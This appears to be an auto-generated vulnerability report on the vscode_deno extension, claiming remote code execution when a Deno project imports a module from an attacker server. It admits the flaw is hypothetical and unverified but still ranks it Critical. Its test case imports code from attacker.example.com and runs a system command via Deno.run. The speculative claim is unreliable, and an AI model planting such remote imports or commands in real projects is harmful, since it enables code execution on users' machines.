## Vulnerability List

### Remote Code Execution via Malicious Deno Project

**Description:**
1. An attacker crafts a malicious Deno project.
2. This project contains a `deno.json` or a Deno file with a remote import statement, pointing to a malicious remote module hosted on an attacker-controlled server.
3. When a user opens this malicious project in Visual Studio Code with the `vscode_deno` extension enabled.
4. The `vscode_deno` extension, when initializing and processing the project, triggers the Deno Language Server to analyze the project and its dependencies.
5. The Deno Language Server, as part of its functionality (e.g., for type-checking, linting, or module resolution), attempts to fetch and cache the remote module specified in the import statement.
6. Due to a vulnerability in the Deno Language Server's module fetching, caching, or processing mechanism, handling the malicious remote module leads to arbitrary code execution on the user's machine. This could occur when the LSP server processes the content of the malicious module or due to vulnerabilities in how it handles URLs or file paths during the module fetching and caching process.

**Impact:** Arbitrary code execution on the user's machine. An attacker can gain full control of the user's system simply by enticing a user to open a seemingly harmless Deno project in VS Code. This can lead to data theft, malware installation, and other malicious activities.

**Vulnerability Rank:** Critical

**Currently Implemented Mitigations:** None in the `vscode_deno` extension directly as the vulnerability is described to be within the Deno Language Server, which is an external dependency. Mitigations would need to be implemented within the Deno CLI and LSP codebase.

**Missing Mitigations:**
- Input validation and sanitization of remote module URLs and content within the Deno Language Server to prevent exploitation through malicious URLs or module content.
- Sandboxing or isolation of the module fetching and caching process within the Deno Language Server to limit the impact of potential vulnerabilities.
- Security review and hardening of the Deno Language Server's module handling logic, particularly focusing on remote module fetching, caching, and processing.
- Implementation of Content Security Policy (CSP) or similar mechanisms within the Deno Language Server to restrict the capabilities of loaded remote modules and prevent arbitrary code execution.

**Preconditions:**
1. The user must have the `vscode_deno` extension installed and enabled in Visual Studio Code.
2. The user must open a malicious Deno project in Visual Studio Code.
3. The malicious project must be crafted to include a remote import that exploits a vulnerability in the Deno Language Server when processed.

**Source Code Analysis:**
The `vscode_deno` extension itself primarily acts as a client to the Deno Language Server. The vulnerability is not expected to be within the `vscode_deno` extension's code, but rather within the Deno Language Server (deno lsp) which is responsible for language features.

The attack vector involves the processing of remote modules by the Deno Language Server. The following is a hypothetical analysis of where the vulnerability could occur within the Deno LSP server (source code not provided):

1. **Remote Module Fetching:** When the LSP server encounters a remote import statement, it initiates a network request to fetch the module from the specified URL. Vulnerabilities could arise if:
    - The URL is not properly validated, allowing for URL manipulation to access unintended resources or trigger server-side vulnerabilities.
    - The fetching process is susceptible to injection attacks if URLs or headers are constructed improperly.

2. **Module Caching:** The Deno LSP server likely caches fetched remote modules to improve performance. Vulnerabilities could arise if:
    - The cache mechanism is vulnerable to path traversal, allowing an attacker to overwrite or access arbitrary files on the user's system.
    - Cache invalidation is not handled correctly, potentially leading to the use of outdated or malicious cached modules.

3. **Module Processing/Execution:** After fetching a remote module, the LSP server parses and processes its content for language features (type-checking, linting, etc.). Vulnerabilities could arise if:
    - The module parser has vulnerabilities that can be triggered by specially crafted malicious module content, leading to buffer overflows, code injection, or other memory corruption issues.
    - The LSP server attempts to execute code within the fetched module in an unsafe manner, without proper sandboxing or security measures.

**Security Test Case:**
1. **Setup Malicious Server:** Create a simple HTTP server (e.g., using Python's `http.server`) that will serve a malicious Deno module. Let's say the server runs on `http://attacker.example.com:8000`.
2. **Create Malicious Module:** Create a file named `malicious_module.ts` to be served by the malicious server. This file should contain code designed to trigger a hypothetical vulnerability. For example, to test for command execution, it could attempt to execute a system command (though Deno's security model might prevent this directly, a more subtle exploit might be needed depending on the actual vulnerability):
   ```typescript
   // malicious_module.ts
   // Hypothetical exploit to trigger RCE - this is just an example, actual exploit would depend on the specific vulnerability
   try {
       // Attempt to execute a command - this is unlikely to work directly due to Deno's security
       // More subtle exploit would be needed, e.g., if vulnerability is in URL parsing or module processing
       Deno.run({ cmd: ["touch", "/tmp/pwned"] });
   } catch (e) {
       console.error("Exploit attempt:", e);
   }
   console.log("Malicious module loaded");
   ```
3. **Create Malicious Deno Project:** Create a new directory for the malicious project. Inside this directory, create a Deno file (e.g., `main.ts`) with a remote import pointing to the malicious server:
   ```typescript
   // main.ts
   import "http://attacker.example.com:8000/malicious_module.ts";
   console.log("Project opened");
   ```
4. **Open Project in VS Code:** Open the malicious project directory in Visual Studio Code with the `vscode_deno` extension enabled.
5. **Observe for Exploitation:**
   - Monitor for the creation of `/tmp/pwned` file (or any other indicator of code execution defined in `malicious_module.ts`).
   - Check the VS Code extension host logs or Deno LSP server logs for any error messages or unusual activity.
   - Network traffic analysis could also be used to observe requests to the malicious server and responses.

**Expected Result:** If the vulnerability exists, opening the project should trigger the execution of the malicious code within `malicious_module.ts` due to a flaw in the Deno Language Server's handling of remote modules.  The test case needs to be adapted based on the specific type of vulnerability being tested for (e.g., path traversal, command injection, parser vulnerability).
